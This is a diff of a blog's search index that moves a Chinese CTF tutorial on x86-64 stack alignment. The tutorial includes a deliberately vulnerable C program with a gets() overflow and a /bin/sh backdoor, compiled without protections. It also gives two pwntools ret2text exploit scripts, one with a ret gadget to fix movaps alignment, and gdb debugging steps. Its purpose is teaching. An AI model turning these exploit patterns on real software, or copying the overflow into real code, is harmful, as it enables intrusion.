@@ -1,95 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
-    <url>/2023/05/08/pwn/%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
-    <content><![CDATA[<h1 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了QWQ，困惑了很久(主要是在脚本中不知道该怎么进行gdb调试)，今天下午研究了一下，造成最后攻击失败的结果应该是<code>movaps</code>指令搞的鬼，经过测试Ubuntu20里有这个问题，Ubuntu16没有。<code>movaps</code>指令要求其目的操作数必须是16的倍数，也就是说其操作数的数值的16进制数的<strong>最后一位</strong>必须为0，这里看一个例子更容易理解§(<em>￣▽￣</em>)§</p>
-<h2 id="环境、源码编译"><a href="#环境、源码编译" class="headerlink" title="环境、源码编译"></a>环境、源码编译</h2><p><strong>Ubuntu20.04</strong></p>
-<blockquote>
-<p>gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</p>
-<p>ldd (Ubuntu GLIBC 2.31-0ubuntu9.9) 2.31</p>
-<p>python3编写exp.py 使用pwntools库</p>
-<p>tmux</p>
-<p>zsh(oh-my-zsh)</p>
-<p>pwndbg、pwngdb</p>
-<p>……</p>
-</blockquote>
-<p>附:在终端下使用的是环境是tmux，直接在terminal输入tmux即可进入，想要使鼠标上下滑动查看和选择区间可以在主目录下的<code>.tmux.conf</code>(没有就新建一个)文件里添加<code>set -g mouse on</code></p>
-<p><strong>源码</strong></p>
-<p>test.c</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">heiheihei</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Congratulations on getting the shell&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Author: vi0let ----a rookie in the team&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;You little smart guy, not here, still have to look for oh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_0111101</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">120</span>];</span><br><span class="line">	gets(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello,welcome to the world of pwn ヾ(≧▽≦*)o\n&quot;</span>);</span><br><span class="line">	sub_0111101();</span><br><span class="line">	<span class="comment">// heiheihei();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -g -z execstack -fno-stack-protector -no-pie -z lazy test.c -o test</span></span><br></pre></td></tr></table></figure>
-
-<p>最后一行就是编译命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -z execstack -fno-stack-protector -no-pie -z lazy test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
-
-<p>附:想要偷懒也可以，我把编译好的文件和相关的文件存入了这里:<a href="https://github.com/lucky-xiaobai/research_pwn/tree/main/stack/Stack%20alignment">https://github.com/lucky-xiaobai/research_pwn/tree/main/stack/Stack%20alignment</a></p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>检查保护(其实编译的时候就已经限制了相关的保护)</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508202924562.png" alt="image-20230508202924562" style="zoom:80%;" />
-
-<p>64位，没有开启保护</p>
-<p>扔进ida分析</p>
-<p><strong>main</strong></p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203401793.png" alt="image-20230508203401793" style="zoom:80%;" />
-
-<p><strong>sub_0111111101</strong></p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203428000.png" alt="image-20230508203428000" style="zoom:80%;" />
-
-<p><strong>heiheihei</strong>(后门函数)</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203536895.png" alt="image-20230508203536895" style="zoom:80%;" />
-
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203622054.png" alt="image-20230508203622054" style="zoom:80%;" />
-
-<p>得到后门函数的地址<code>0x0000000000401196</code></p>
-<p>分析结束，其实是一个很简单的<code>ret2text</code>类型的程序，由于栈上可执行也可以直接填充<code>shellcode</code>，这里就选择前者的方法，修改到后门函数执行就可以了</p>
-<p>再找一个<code>ret</code>用来为后面的栈对齐做准备</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508204353165.png" alt="image-20230508204353165" style="zoom:80%;" />
-
-<p>这里就选最后一个了:<code>ret=0x000000000040101a</code></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先写一个未栈对齐的exp</p>
-<p><strong>exp</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]			<span class="comment"># use tmux</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment"># related information and set log_level</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)								<span class="comment"># 本地测试</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)									<span class="comment"># 填充垃圾数据，加8是为了覆盖leave和ret</span></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment"># 这里是利用pwntools库生成64位的shellcode，这次没用到，可以注释掉</span></span><br><span class="line">backdoor=<span class="number">0x0000000000401196</span>							<span class="comment"># 后门函数的地址</span></span><br><span class="line">main= elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment"># main函数的地址，也可以在ida中查找直接填写</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span>								<span class="comment"># ROPgadget查找</span></span><br><span class="line"></span><br><span class="line">log.info(shellc)									<span class="comment"># 打印出库生成的shellc看一下</span></span><br><span class="line"></span><br><span class="line">payload=junk+p64(backdoor)+<span class="string">b&#x27;deadbeef&#x27;</span>	<span class="comment"># Stack alignment	# 构造payload</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)								<span class="comment"># 使用gdb追踪调试</span></span><br><span class="line"></span><br><span class="line">pause()												<span class="comment"># 在发送payload前暂停一下，方便查看调试信息</span></span><br><span class="line">io.sendline(payload)								<span class="comment"># 发送</span></span><br><span class="line"></span><br><span class="line">io.interactive()									<span class="comment"># 和终端进行交互</span></span><br></pre></td></tr></table></figure>
-
-<p>可以先把调试的语句注释掉看一下最终是否能成功</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205403824.png" alt="image-20230508205403824" style="zoom:80%;" />
-
-<p>可以看到结果是失败的，把注释掉的调试语句取消掉注释。</p>
-<p>运行调试查看一下</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205004970.png" alt="image-20230508205004970" style="zoom:80%;" />
-
-<p>左面显示处于暂停状态，选择左面，然后按一下回车，得到如下</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508204850712.png" alt="image-20230508204850712" style="zoom:80%;" />
-
-<p>剩下只需要分析右面的gdb中的信息即可</p>
-<p>可以使用<code>ni</code>单步分析</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205827966.png" alt="image-20230508205827966" style="zoom:80%;" />
-
-<p>也可以使用<code>finish</code>跳出当前的系统函数</p>
-<p>几次后，得到如下的状态，可以看到<code>sub_01111101</code>函数执行结束后到后门函数那边去了，接下来为了避免跳出关键函数，使用<code>ni</code>单步调试</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210028290.png" alt="image-20230508210028290" style="zoom:80%;" />
-
-<p>如下，接下来再填入一次<code>ni</code>就是报错的地方了，其实这里已经可以看到栈已经不对齐了(<code>rsp</code>末尾是8)</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211555679.png" alt="image-20230508211555679" style="zoom:80%;" />
-
-<p>调试到<code>movaps</code>指令时候如下所示，显然，<code>rsp=0x7fffffffdba8</code>，所以造成了溢出的失败</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210350739.png" alt="image-20230508210350739" style="zoom:80%;" />
-
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210534588.png" alt="image-20230508210534588" style="zoom:80%;" />
-
-<p>再写一个栈对齐的exp</p>
-<p><strong>exp</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">shellc=asm(shellcraft.sh())</span><br><span class="line">backdoor=<span class="number">0x0000000000401196</span></span><br><span class="line">main= elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">log.info(shellc)</span><br><span class="line"></span><br><span class="line">payload=junk+p64(ret)+p64(backdoor)+<span class="string">b&#x27;deadbeef&#x27;</span>	<span class="comment"># Stack alignment</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里就直接去调试了，调试的过程和上面一模一样</p>
-<p>调试结果如下</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211041861.png" alt="image-20230508211041861" style="zoom:80%;" />
-
-<p>再填入<code>ni</code>就可以程序没有跳转到报错的<code>movaps</code>那边，而是正常的结束了</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211202682.png" alt="image-20230508211202682" style="zoom:80%;" />
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>检测栈对齐其实就是<code>movaps</code>指令造成的，可以填充一个或多个<code>ret</code>指令来使栈上的数据对齐。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>pwn学习路线</title>
     <url>/2022/06/01/pwn/pwn%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
     <content><![CDATA[<p>CTFwiki：<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">https://ctf-wiki.org/pwn/linux/user-mode/environment/</a></p>
@@ -255,6 +166,103 @@
 
 <p>用aaaa%4$p打印看看(a的ASCII值是0x61)</p>
 <img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193443643.png" alt="image-20220502193443643" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF Wiki之栈溢出</title>
+    <url>/2023/05/08/pwn/%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
+    <content><![CDATA[<h1 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了QWQ，困惑了很久(主要是在脚本中不知道该怎么进行gdb调试)，今天下午研究了一下，造成最后攻击失败的结果应该是<code>movaps</code>指令搞的鬼，经过测试Ubuntu20里有这个问题，Ubuntu16没有。<code>movaps</code>指令要求其目的操作数必须是16的倍数，也就是说其操作数的数值的16进制数的<strong>最后一位</strong>必须为0，这里看一个例子更容易理解§(<em>￣▽￣</em>)§</p>
+<span id="more"></span>
+
+<h2 id="环境、源码编译"><a href="#环境、源码编译" class="headerlink" title="环境、源码编译"></a>环境、源码编译</h2><p><strong>Ubuntu20.04</strong></p>
+<blockquote>
+<p>gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</p>
+<p>ldd (Ubuntu GLIBC 2.31-0ubuntu9.9) 2.31</p>
+<p>python3编写exp.py 使用pwntools库</p>
+<p>tmux</p>
+<p>zsh(oh-my-zsh)</p>
+<p>pwndbg、pwngdb</p>
+<p>……</p>
+</blockquote>
+<p>附:在终端下使用的是环境是tmux，直接在terminal输入tmux即可进入，想要使鼠标上下滑动查看和选择区间可以在主目录下的<code>.tmux.conf</code>(没有就新建一个)文件里添加<code>set -g mouse on</code></p>
+<p><strong>源码</strong></p>
+<p>test.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">heiheihei</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Congratulations on getting the shell&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Author: vi0let ----a rookie in the team&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;You little smart guy, not here, still have to look for oh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_0111101</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">120</span>];</span><br><span class="line">	gets(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello,welcome to the world of pwn ヾ(≧▽≦*)o\n&quot;</span>);</span><br><span class="line">	sub_0111101();</span><br><span class="line">	<span class="comment">// heiheihei();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -g -z execstack -fno-stack-protector -no-pie -z lazy test.c -o test</span></span><br></pre></td></tr></table></figure>
+
+<p>最后一行就是编译命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -z execstack -fno-stack-protector -no-pie -z lazy test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>附:想要偷懒也可以，我把编译好的文件和相关的文件存入了这里:<a href="https://github.com/lucky-xiaobai/research_pwn/tree/main/stack/Stack%20alignment">https://github.com/lucky-xiaobai/research_pwn/tree/main/stack/Stack%20alignment</a></p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>检查保护(其实编译的时候就已经限制了相关的保护)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508202924562.png" alt="image-20230508202924562" style="zoom:80%;" />
+
+<p>64位，没有开启保护</p>
+<p>扔进ida分析</p>
+<p><strong>main</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203401793.png" alt="image-20230508203401793" style="zoom:80%;" />
+
+<p><strong>sub_0111111101</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203428000.png" alt="image-20230508203428000" style="zoom:80%;" />
+
+<p><strong>heiheihei</strong>(后门函数)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203536895.png" alt="image-20230508203536895" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203622054.png" alt="image-20230508203622054" style="zoom:80%;" />
+
+<p>得到后门函数的地址<code>0x0000000000401196</code></p>
+<p>分析结束，其实是一个很简单的<code>ret2text</code>类型的程序，由于栈上可执行也可以直接填充<code>shellcode</code>，这里就选择前者的方法，修改到后门函数执行就可以了</p>
+<p>再找一个<code>ret</code>用来为后面的栈对齐做准备</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508204353165.png" alt="image-20230508204353165" style="zoom:80%;" />
+
+<p>这里就选最后一个了:<code>ret=0x000000000040101a</code></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先写一个未栈对齐的exp</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]			<span class="comment"># use tmux</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment"># related information and set log_level</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)								<span class="comment"># 本地测试</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)									<span class="comment"># 填充垃圾数据，加8是为了覆盖leave和ret</span></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment"># 这里是利用pwntools库生成64位的shellcode，这次没用到，可以注释掉</span></span><br><span class="line">backdoor=<span class="number">0x0000000000401196</span>							<span class="comment"># 后门函数的地址</span></span><br><span class="line">main= elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment"># main函数的地址，也可以在ida中查找直接填写</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span>								<span class="comment"># ROPgadget查找</span></span><br><span class="line"></span><br><span class="line">log.info(shellc)									<span class="comment"># 打印出库生成的shellc看一下</span></span><br><span class="line"></span><br><span class="line">payload=junk+p64(backdoor)+<span class="string">b&#x27;deadbeef&#x27;</span>	<span class="comment"># Stack alignment	# 构造payload</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)								<span class="comment"># 使用gdb追踪调试</span></span><br><span class="line"></span><br><span class="line">pause()												<span class="comment"># 在发送payload前暂停一下，方便查看调试信息</span></span><br><span class="line">io.sendline(payload)								<span class="comment"># 发送</span></span><br><span class="line"></span><br><span class="line">io.interactive()									<span class="comment"># 和终端进行交互</span></span><br></pre></td></tr></table></figure>
+
+<p>可以先把调试的语句注释掉看一下最终是否能成功</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205403824.png" alt="image-20230508205403824" style="zoom:80%;" />
+
+<p>可以看到结果是失败的，把注释掉的调试语句取消掉注释。</p>
+<p>运行调试查看一下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205004970.png" alt="image-20230508205004970" style="zoom:80%;" />
+
+<p>左面显示处于暂停状态，选择左面，然后按一下回车，得到如下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508204850712.png" alt="image-20230508204850712" style="zoom:80%;" />
+
+<p>剩下只需要分析右面的gdb中的信息即可</p>
+<p>可以使用<code>ni</code>单步分析</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205827966.png" alt="image-20230508205827966" style="zoom:80%;" />
+
+<p>也可以使用<code>finish</code>跳出当前的系统函数</p>
+<p>几次后，得到如下的状态，可以看到<code>sub_01111101</code>函数执行结束后到后门函数那边去了，接下来为了避免跳出关键函数，使用<code>ni</code>单步调试</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210028290.png" alt="image-20230508210028290" style="zoom:80%;" />
+
+<p>如下，接下来再填入一次<code>ni</code>就是报错的地方了，其实这里已经可以看到栈已经不对齐了(<code>rsp</code>末尾是8)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211555679.png" alt="image-20230508211555679" style="zoom:80%;" />
+
+<p>调试到<code>movaps</code>指令时候如下所示，显然，<code>rsp=0x7fffffffdba8</code>，所以造成了溢出的失败</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210350739.png" alt="image-20230508210350739" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210534588.png" alt="image-20230508210534588" style="zoom:80%;" />
+
+<p>再写一个栈对齐的exp</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">shellc=asm(shellcraft.sh())</span><br><span class="line">backdoor=<span class="number">0x0000000000401196</span></span><br><span class="line">main= elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">log.info(shellc)</span><br><span class="line"></span><br><span class="line">payload=junk+p64(ret)+p64(backdoor)+<span class="string">b&#x27;deadbeef&#x27;</span>	<span class="comment"># Stack alignment</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里就直接去调试了，调试的过程和上面一模一样</p>
+<p>调试结果如下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211041861.png" alt="image-20230508211041861" style="zoom:80%;" />
+
+<p>再填入<code>ni</code>就可以程序没有跳转到报错的<code>movaps</code>那边，而是正常的结束了</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211202682.png" alt="image-20230508211202682" style="zoom:80%;" />
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>检测栈对齐其实就是<code>movaps</code>指令造成的，可以填充一个或多个<code>ret</code>指令来使栈上的数据对齐。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
